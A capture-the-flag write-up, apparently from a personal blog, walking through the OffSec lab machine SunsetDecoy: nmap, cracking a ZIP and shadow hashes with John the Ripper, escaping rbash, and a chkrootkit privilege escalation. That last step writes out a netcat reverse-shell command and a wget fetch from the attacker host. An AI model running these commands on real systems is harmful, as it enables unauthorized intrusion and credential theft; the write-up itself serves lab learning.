+++
title = "SunsetDecoy - Easy"
date = 2025-09-18
draft = false
type = "post"        # üîë essencial para o tema contar como post
platform = "OffSec"
ctf = "CTF"
categories = ['OffSec', 'Easy']
tags = ["OffSec", "CTF", "Easy"]

cover = "/sunsetDecoy/sunset.png"
description = "SunsetDecoy Walkthrough (OffSec - Easy)."
+++

<!-- cole isto no corpo do post (depois do front matter) -->

<article class="writeup">
  <header class="hero">
    <div class="meta">
      <h1>SunsetDecoy</h1>
      <p class="subtitle">SunsetDecoy Walkthrough</p>
      <div class="links">
        <a href="/posts/offsec/" class="back">‚Üê Back to OffSec</a>
      </div>
    </div>
    <figure class="cover">
      <img src="/sunsetDecoy/sunset.png" alt="SunsetDecoy cover">
    </figure>
  </header>

  <main class="content">
    <section class="section">
      <h2>Summary</h2>
      <p>The SunsetDecoy machine is a web-based OffSec machine containing sensitive files protected by a password. We used John the Ripper and unshadow to find a valid user. After the first login in a restricted (rbash) shell, we bypassed the limitations and exploited the chrootkit vulnerability (CVE-2014-0476) to escalate privileges and gain root.</p>
    </section>

    <section class="section">
      <h2>Enumeration</h2>
      <p>A port scan was performed using Nmap, which revealed the open ports 22 (SSH) and 80 (HTTP):</p>

      <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ‚Äî nmap</span>
        </div>

        <pre class="term-body"><code>nmap -v -Pn -sV -sC -p- 192.168.243.85 --min-rate=300 -T4
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38
...
</code></pre>
      </div>

      <p>Accessing port 80 (HTTP) revealed the file <code>save.zip</code>, which was subsequently downloaded for further analysis.:</p>
      <figure class="screenshot">
        <img src="/sunsetDecoy/pasted-image-20250917110228.png" alt="Download ZIP">
      </figure>
    </section>

    <section class="section">
      <h2>Cracking the ZIP Password with JohnTheRipper</h2>

      <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ‚Äî zip2john</span>
        </div>
        <pre class="term-body"><code>zip2john save.zip &gt; zip_hash.txt</code></pre>
      </div>

      <p>Running JohnTheRipper to crack the password from the extracted ZIP hash:</p>

      <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ‚Äî john</span>
        </div>
        <pre class="term-body"><code>john zip_hash.txt
...
manuel (save.zip)
</code></pre>
      </div>
    </section>

    <section class="section">
      <h2>Extraction and Preparation of Password Files</h2>
      <p>After extracting the ZIP contents, two important files were identified in the <code>/etc</code> directory:</p>

      <ul>
        <li><code>passwd</code></li>
        <li><code>shadow</code></li>
      </ul>

      <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ‚Äî /etc</span>
        </div>
        <pre class="term-body"><code>cd /etc
...
group  hash.txt  hostname  hosts  passwd  shadow  sudoers
</code></pre>
      </div>

      <p>Using these files, the <code>unshadow</code> command was applied, which merges <code>passwd</code> and <code>shadow</code> into a single file compatible with JohnTheRipper, allowing the cracking of existing user passwords.</p>
    
          <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ‚Äî unshadow </span>
        </div>
        <pre class="term-body"><code>unshadow passwd shadow > hash.txt</code></pre>
      </div>
      
      <p>Using the file generated by <code>unshadow</code>, <code>john</code> was used to crack the users passwords.</p>

    <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ‚Äî john </span>
        </div>
        <pre class="term-body"><code>john hash.txt
...
server  (296640a3b825115a47b68fc44501c828)</code></pre>
      </div>      
    </section>

    <section class="section">
      <h2>Initial Access</h2>
      <p>After starting an SSH session with the user <code>296640a3b825115a47b68fc44501c828</code>, it was observed that the shell was running in restricted mode <code>rbash</code>. In this mode, Bash restricts certain commands, limiting full shell access.</p>

      <figure class="screenshot">
        <img src="/sunsetDecoy/pasted-image-20250917114117.png" alt="rbash restriction">
      </figure>

      <p>To bypass this restriction, online research was conducted, leading to a relevant GitHub post:</p>
      <p><a href="https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290" target="_blank" rel="noopener noreferrer">gist.github.com/PSJoshi/... (escape rbash)</a></p>

      <figure class="screenshot">
        <img src="/sunsetDecoy/pasted-image-20250917114001.png" alt="Bypass restriction rbash">
      </figure>

      <p>After bypassing the restricted shell, the first flag was obtained.</p>

      <figure class="screenshot">
        <img src="/sunsetDecoy/pasted-image-20250917114729.png" alt="First flag">
      </figure>
    </section>

    <section class="section">
      <h2>Privilege Escalation</h2>

      <p>While inspecting the `home` directory of user <code>296640a3b825115a47b68fc44501c828</code>, a script named <code>honeypot.decoy</code> was identified, which runs with root privileges.</p>
      <p>After running the <code>honeypot.decoy</code> script several times using option <code>5</code>, the system's running processes were checked.</p>
      
      <figure class="screenshot">
        <img src="/sunsetDecoy/pasted-image-20250917115517.png" alt="Script honeypot.decoy">
      </figure>
      
      <p>By analyzing the running processes, it was possible to identify that <code>chkrootkit-0.49</code> is vulnerable to privilege escalation.</p>

      <table class="exploit">
        <thead><tr><th>CVE</th><th>Exploit</th></tr></thead>
        <tbody>
          <tr><td>CVE-2014-0476</td><td><a href="https://www.exploit-db.com/exploits/33899" target="_blank" rel="noopener noreferrer">exploit-db 33899</a></td></tr>
        </tbody>
      </table>

      <figure class="screenshot">
        <img src="/sunsetDecoy/pasted-image-20250917115408.png" alt="system processes">
      </figure>

      <p>To exploit the vulnerability, the exploit was transferred to the attacking machine and the following steps were performed:</p>
      <ol>
        <li>Rename the file to: <code>mv 33899.txt update</code></li>
         <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ~</span>
        </div>
        <pre class="term-body"><code>mv 33899.txt update</code></pre>
      </div>      
        <li>Add a reverse shell to the attacking machine:</li>
         <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ~</span>
        </div>
        <pre class="term-body"><code>echo '/usr/bin/nc 192.168.45.151 4142 -e /bin/bash' > update</code></pre>
      </div>      
        <li>Transfer the file to the target machine:</li>
         <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ~</span>
        </div>
        <pre class="term-body"><code>wget http://192.168.45.151:8000/update</code></pre>
      </div>      

        <figure class="screenshot">
        <img src="/sunsetDecoy/pasted-image-20250917121957.png" alt="">
      </figure>

        <li>Grant execution permission to the file:</li>
         <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ~</span>
        </div>
        <pre class="term-body"><code>chmod +x update</code></pre>
      </div>
        <li>Open a listening port on the attacking machine to receive the shell:</li>
         <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ~</span>
        </div>
        <pre class="term-body"><code>nc -lnvp 4142</code></pre>
      </div>
      <li>Execute the honeypot.decoy file on the target machine:</li>
         <div class="terminal">
        <div class="term-bar">
          <span class="lights">
            <i class="dot red"></i>
            <i class="dot yellow"></i>
            <i class="dot green"></i>
          </span>
          <span class="term-title">bash ~</span>
        </div>
        <pre class="term-body"><code>./honeypot.decoy</code></pre>
      </div>
      
       <figure class="screenshot">
        <img src="/sunsetDecoy/pasted-image-20250917122405.png" alt="">
      </figure>
      </ol>

      <p>After establishing the reverse shell, the system was accessed with the necessary privileges and the final flag was retrieved.</p>

      <figure class="screenshot">
        <img src="/sunsetDecoy/pasted-image-20250917122542.png" alt="root flag">
      </figure>
    </section>
  </main>
</article>

<style>
/* Import font (vai carregar do Google Fonts).
   Se preferir n√£o depender de rede, troque por uma font local. */
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');

:root{
  --bg:#0b0b0b;
  --card:#141414;
  --muted:#a9a9a9;
  --red:#ff3b3b;
  --accent:#ff6b6b;
  --text:#ececec;
  --terminal-bg: linear-gradient(180deg,#071014,#0b0b0b);
  --terminal-line:#0f1720;
  --term-green:#78ff7a;
}

*{box-sizing:border-box}
body{background:var(--bg); color:var(--text); font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial; line-height:1.5}
.writeup{max-width:1000px;margin:32px auto;padding:18px}
.hero{display:grid;grid-template-columns:1fr 340px;gap:20px;align-items:center;margin-bottom:18px}
.hero .meta h1{margin:0;color:var(--red);font-size:2rem}
.hero .meta .subtitle{color:var(--muted);margin-top:8px}
.hero .cover img{width:100%;height:220px;object-fit:cover;border-radius:10px;border:1px solid rgba(255,255,255,0.04);box-shadow:0 8px 30px rgba(255,0,0,0.06)}
.back{display:inline-block;margin-top:10px;color:var(--muted);text-decoration:none;border:1px solid rgba(255,255,255,0.02);padding:6px 10px;border-radius:6px}
.back:hover{color:var(--text);background:rgba(255,255,255,0.02)}

/* Content */
.content{background:transparent;padding:6px}
.section{margin:22px 0;padding:18px;border-radius:10px;background:linear-gradient(180deg, rgba(255,0,0,0.01), rgba(0,0,0,0.02));border:1px solid rgba(255,59,59,0.04)}
.section h2{color:var(--accent);margin-top:0}
.section p, .section li{color:var(--text)}

/* Terminal-like code box (macOS vibe) */
.terminal{margin:16px 0;border-radius:10px;overflow:hidden;border:1px solid rgba(255,255,255,0.03);box-shadow:0 10px 30px rgba(0,0,0,0.6);background:var(--terminal-bg)}
.term-bar{display:flex;align-items:center;gap:10px;padding:10px 12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.05));border-bottom:1px solid rgba(255,255,255,0.02)}
.lights{display:inline-flex;gap:8px;align-items:center}
.dot{width:12px;height:12px;border-radius:50%;display:inline-block;box-shadow:0 2px 0 rgba(0,0,0,0.4)}
.dot.red{background:#ff5f57}
.dot.yellow{background:#ffbd2e}
.dot.green{background:#28c840}
.term-title{color:var(--muted);font-size:0.85rem;margin-left:6px}

/* Terminal body */
.term-body{margin:0;padding:18px 16px;overflow:auto;background:#02040a;color:var(--term-green);font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,'Liberation Mono','Courier New',monospace;font-size:13px;line-height:1.45}
.term-body code{white-space:pre;display:block}

/* Screenshot styling */
.screenshot{margin:14px 0;text-align:center}
.screenshot img{max-width:100%;border-radius:8px;border:1px solid rgba(255,255,255,0.03)}
.screenshot figcaption{display:block;color:var(--muted);font-size:0.9rem;margin-top:8px}

/* Tables and lists */
table.exploit{width:100%;border-collapse:collapse;margin:12px 0}
table.exploit th, table.exploit td{border:1px solid rgba(255,255,255,0.03);padding:8px;text-align:left;color:var(--text)}
table.exploit th{background:rgba(255,59,59,0.06);color:var(--accent)}

/* Footer meta */
.post-footer{margin-top:28px;padding-top:12px;border-top:1px solid rgba(255,255,255,0.02)}
.meta-small{color:var(--muted);font-size:0.9rem}

/* Responsive */
@media (max-width:900px){
  .hero{grid-template-columns:1fr;grid-auto-rows:auto}
  .hero .cover img{height:200px}
  .writeup{padding:12px}
}

section code, p code {
    background: rgba(255, 0, 0, 0.05); /* fundo leve para destacar */
    color: #ff4c4c; /* vermelho mais vivo */
    font-weight: 600; /* um pouco mais grosso */
    padding: 2px 4px;
    border-radius: 4px;
    letter-spacing: 1.5px;
}
</style>
